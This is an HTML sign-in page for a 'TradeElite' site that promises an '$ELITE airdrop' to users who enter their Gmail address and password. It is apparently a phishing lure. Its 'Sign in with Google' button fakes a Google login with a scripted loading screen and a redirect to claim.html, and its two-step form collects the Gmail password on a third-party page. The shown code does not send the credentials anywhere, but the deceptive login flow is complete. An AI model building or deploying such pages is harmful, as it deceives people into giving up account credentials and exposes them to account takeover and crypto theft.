<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TradeElite - Sign in</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
        
        body {
            font-family: 'Inter', system-ui, sans-serif;
            background: linear-gradient(135deg, #0a0f1c, #1a2338);
            color: #e2e8f0;
            margin: 0; padding: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: rgba(15, 23, 42, 0.98);
            border: 1px solid #334155;
            border-radius: 20px;
            padding: 40px 30px;
            width: 420px;
            text-align: center;
            box-shadow: 0 25px 60px -10px rgb(0 0 0 / 0.6);
        }
        .logo {
            width: 64px; height: 64px; background: #22c55e; color: #0f172a;
            border-radius: 50%; display: inline-flex; align-items: center;
            justify-content: center; font-size: 32px; font-weight: 700; margin-bottom: 20px;
        }
        h1 { font-size: 24px; margin: 0 0 8px 0; color: white; }
        p { color: #94a3b8; margin-bottom: 24px; font-size: 15px; }
        
        input {
            width: 100%;
            padding: 14px 16px;
            background: #1e2937;
            border: 1px solid #475569;
            border-radius: 10px;
            color: #e2e8f0;
            font-size: 15px;
            margin-bottom: 12px;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            border-color: #22c55e;
        }
        
        .gmail-btn {
            display: flex; align-items: center; justify-content: center; gap: 12px;
            background: white; color: #1f2937; border: none; border-radius: 12px;
            padding: 14px 24px; font-size: 16px; font-weight: 600; cursor: pointer;
            width: 100%; margin: 20px 0;
        }
        .gmail-btn:hover { background: #f1f5f9; }
        
        button.continue {
            background: #22c55e; color: #0f172a; font-weight: 700;
            padding: 14px; width: 100%; border: none; border-radius: 12px;
            font-size: 16px; cursor: pointer;
        }
        
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container" id="container">
        <div class="logo">TE</div>
        <h1 id="title">Sign in to TradeElite</h1>
        <p id="subtitle">Use your Gmail account to claim your $ELITE airdrop</p>

        <!-- Step 1: Email -->
        <div id="emailStep">
            <input type="email" id="emailInput" placeholder="your.email@gmail.com" value="user@gmail.com">
            <button class="gmail-btn" onclick="useGoogle()">
                
                Sign in with Google
            </button>
            <button class="continue" onclick="nextStep()">Continue</button>
        </div>

        <!-- Step 2: Password -->
        <div id="passwordStep" class="hidden">
            <input type="password" id="passwordInput" placeholder="Password">
            <button class="continue" onclick="submitLogin()">Sign in</button>
            <p style="margin-top:20px; font-size:13px; color:#64748b; cursor:pointer;" onclick="backToEmail()">
                ← Back
            </p>
        </div>
    </div>

    <script>
        function useGoogle() {
            fakeLoading("Signing in with Google...");
            setTimeout(() => {
                window.location.href = "claim.html";
            }, 1400);
        }

        function nextStep() {
            const email = document.getElementById('emailInput').value.trim();
            if (email === "") {
                alert("Please enter your email");
                return;
            }
            
            document.getElementById('emailStep').classList.add('hidden');
            document.getElementById('passwordStep').classList.remove('hidden');
            document.getElementById('title').textContent = "Enter password";
            document.getElementById('subtitle').textContent = email;
        }

        function backToEmail() {
            document.getElementById('emailStep').classList.remove('hidden');
            document.getElementById('passwordStep').classList.add('hidden');
            document.getElementById('title').textContent = "Sign in to TradeElite";
            document.getElementById('subtitle').textContent = "Use your Gmail account to claim your $ELITE airdrop";
        }

        function submitLogin() {
            const password = document.getElementById('passwordInput').value.trim();
            if (password === "") {
                alert("Please enter your password");
                return;
            }
            
            fakeLoading("Signing in...");
            setTimeout(() => {
                window.location.href = "claim.html";
            }, 1300);
        }

        function fakeLoading(text) {
            const container = document.getElementById('container');
            container.innerHTML = `
                <div style="padding:60px 20px;">
                    <div style="margin-bottom:20px;">${text}</div>
                    <div style="width:40px;height:40px;border:4px solid #334155;border-top:#22c55e;border-radius:50%;margin:auto;animation:spin 1s linear infinite;"></div>
                </div>
            `;
        }
    </script>
</body>
</html>
